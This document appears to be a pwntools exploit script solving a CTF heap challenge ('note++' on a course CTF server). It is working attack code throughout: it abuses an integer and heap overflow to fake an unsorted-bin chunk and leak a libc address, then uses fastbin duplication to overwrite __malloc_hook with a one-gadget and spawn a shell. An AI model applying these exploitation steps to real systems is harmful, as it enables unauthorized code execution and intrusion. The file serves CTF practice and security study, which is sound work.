#!/usr/bin/env python
# coding:utf-8

from pwn import *

def add(size, content, description):
    r.sendlineafter( '>', '1' )
    r.sendlineafter( 'Size:', str( size ) )
    r.sendlineafter( 'Note:', str( content ) )
    r.sendlineafter( 'Description of this note:', str( description ) )

def delete( index ):
    r.sendlineafter( '>', '3' )
    r.sendlineafter( 'Index:', str( index ) )

def list():
    r.sendlineafter( '>', '2' )

context.clear(arch='x86_64')
r = process( './note++' )
r = remote( 'edu-ctf.csie.org', 10181 )
libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )
onegadget = 0xf02a4

add( 0x10, 'aaa', 'bbb' )
add( 0x70, 'aaa', 'bbb' )
add( 0x10, 'aaa', 'bbb' )
add( 0x10, 'aaa', 'bbb' )

# Integer overflow and heap overflow with "unsortbin size"
delete( 0 )
payload = 'A'*16 + p64(0) + p64(0xa1)
add( 0, payload, 'bbb' )
# Avoid Double-Free
delete( 0 )
# Put unsortbin size into heapinfo
delete( 1 )
# Null byte overflow to bypass is_free check
add( 0, 'aaa', 'b'*48 )
# ====== Leak Step ======
list()
r.recvuntil( 'Note 1:' )
r.recvuntil( 'Data: ' )
unsortLeak = u64( r.recv(6) + '\x00\x00' )
libc.address = unsortLeak - 0x3c4b78
log.success( 'leak libc: ' + hex( unsortLeak ) )
log.success( 'libc address: ' + hex( libc.address ) )
log.info( 'malloc_hook: ' + hex( libc.symbols['__malloc_hook'] ) )

delete( 3 )
delete( 2 )
add( 0x68, 'xxx', 'yyy' )
add( 0x68, 'xxx', 'yyy' )
delete( 3 )
delete( 2 )

add( 0x68, 'zzz', 'c'*48 )
delete( 2 )
delete( 3 )
payload = p64( libc.symbols['__malloc_hook'] -0x13 )
add( 0x68, payload, 'A'*0x20 )
add( 0x68, 'xxx', 'yyy' )
add( 0x68, 'xxx', 'yyy' )

'''
add( 0x30, 'qqq', 'www' )
add( 0x50, 'qqq', 'www' )
add( 0x30, 'qqq', 'www' )
add( 0x30, 'qqq', 'www' )
delete( 5 )
delete( 6 )
add( 0x30, 'qqq', 'w'*48 )
'''

payload = 'AAA' + p64( libc.address + onegadget )
add( 0x68 , payload , 'yyy' )

r.interactive()
